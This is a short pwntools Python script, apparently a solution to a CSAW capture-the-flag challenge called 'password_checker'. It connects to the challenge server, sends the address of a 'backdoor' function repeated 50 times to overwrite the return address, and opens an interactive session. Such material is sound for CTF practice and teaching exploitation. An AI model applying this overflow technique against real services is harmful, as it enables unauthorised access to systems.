from pwn import *

if __name__ == "__main__":
    #io = process('./password_checker')
    io = remote('pwn.chal.csaw.io',5000)
    exe = ELF('./password_checker')

    #io.sendlineafter(b'>',p64(exe.sym.backdoor)*50)
    io.sendlineafter(b'>',p64(0x00401176)*50)
    io.interactive()